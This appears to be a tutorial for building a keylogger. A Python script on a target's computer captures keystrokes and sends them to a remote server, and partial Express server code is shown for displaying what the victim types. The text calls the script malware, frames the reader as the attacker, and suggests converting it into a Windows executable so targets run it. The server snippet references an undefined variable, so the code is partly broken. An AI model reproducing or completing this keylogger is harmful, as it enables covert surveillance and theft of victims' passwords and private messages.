Description

This is a simple keylogger project that combines JavaScript, Python and a remote server to track keyboard keys pressed on a computer. First we need to setup a remote server to print the keys pressed in the target pc. With the IP address of the server and the listening port, I've programmed a Python script that dumps json payloads and send it through a POST request to the remote server. The payloads are created when the target press any key.

Here we want to use a listener that will fetch each key pressed down and then call our post_request function (yet to be coded). The pynput package has a listener inside the keyboard class. We assign to a 'on_press' parameter our key_down method, and then the listener will fetch each key pressed while the target is online. JavaScript Listener

Now we are ready to write our last script. We want to write a JavaScript code that will fetch the POST requests sent by our Python script malware. This script, however, should be ran inside our remote server, differently from our Python script that runs inside the target machine. This piece of code is only responsible to interpret and display in our server what the target is typing. We start by importing the libraries needed: 

        
            const fs = require("fs");
            const express = require("express");
            const prompt = require("prompt-sync")({ sigint: true });

            const port = prompt("Enter listening port: ");
            const app = express();

            app.use(express.json({ extended: true }));

First three lines are just defining the libraries. In the port constant, we ask for the user to input the listening port of the server (this should be the same port as we input in the Python script). The app constant creates an Express application instance, which will be used to handle HTTP requests. The last line sets up middleware for the application, specifically for parsing JSON data that is sent in the request body. The extended option, when set to true, allows for more complex objects to be encoded as JSON. We now need to add two endpoints: a GET and POST endpoints. Let's tart with the GET endpoint: 

        
            const fs = require("fs");
            const express = require("express");
            const prompt = require("prompt-sync")({ sigint: true });

            const port = prompt("Enter listening port: ");
            const app = express();

            app.get("/", (req, res) => {
                try {

                    res.send(`<h1>Logger</h1><p>${file.replace("\n", "<br>")}`);
                } catch {
                    res.send("<h1>Nothing logged</h1>");
                }
            })

The GET endpoint retrieves the contents of a file named "keyboard_log.txt", and returns it to the client as an HTML page with a header and the contents of the file, separated by line breaks. If the file does not exist, it returns a message saying that there is nothing logged.

Final considerations

This is a simple keylogger project that needs more sharpening. It is a front-door to a much robust keylogger and it is only meant to illustrate how to build a connection between a target and a remote server using Python and JavaScript. These two endpoints talk to each other by sending HTTP requests. All the pressed keys in the target pc is logged into the remote server root page in HTML format, synchronously. What is being typed by the target is going to show on the attacker screen as long as the target is online and the Python script is running. The first drawback of this code is that the target needs to have Python installed, as well as all the packages used in the script. Another drawback is that the target needs to run the script in order to be vulnerable to it. There are a few ways to bypass this, one of each is by making the .py file to be an executable file .exe (if target uses a Windows machine). However, the target still needs to have Python installed.
